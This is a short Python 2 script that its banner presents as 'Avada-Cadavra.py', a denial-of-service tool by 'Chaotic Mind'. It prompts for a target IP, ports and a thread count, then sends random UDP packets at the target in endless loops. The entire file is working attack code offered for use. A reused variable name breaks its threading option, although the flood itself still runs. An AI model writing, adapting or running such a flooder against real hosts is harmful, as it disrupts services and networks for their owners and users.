import socket, random, threading
print"""\033[92m

  ################################
  
     hello there and welcome!!!
  this is Chaotic Mind's property 
  so expect an exciting experience 
  for you with this DoS tool


  Tool:
      Avada-Cadavra.py
      
  Author:
      Chaotic Mind 
      
      
  enjoy!!!!
  
  ################################  """
def f():
 global pr
 pr=[]
 n=input('\n      OPEN PORTS NUMBER:\n      >')
 print'\n      PORTS:'
 for z in range(n):
  po=input('      >')
  pr.append(po)
 return pr

ip=raw_input('\n\n      TARGET IP:\n      >')
f()
b=input('\n      USE THREADS?\n       1-yes\n       2-no\n      >')
if b==1:
 y=input('\n      THREADS:\n      >')
else:
 pass
 
i=0
def b(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 160)
        out_str += chr(a)
    return(out_str)

def k():
 global i
 i+=1
 if i%1000==0:
  print'packets sent:', i
 
def so():
 for p in pr:
  try:
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   s.connect((ip,p))
   s.sendto(b(random.randint(10,15)),(ip,p))
   k()
  except socket.error:
   pass

class HTTPThread(threading.Thread):
	def run(self):
		try:
			while True:
				so()
		except Exception, ex:
			pass
if b==1:
 for x in range(y):
  t = HTTPThread()
  t.start()
else:
 while True:
  so()

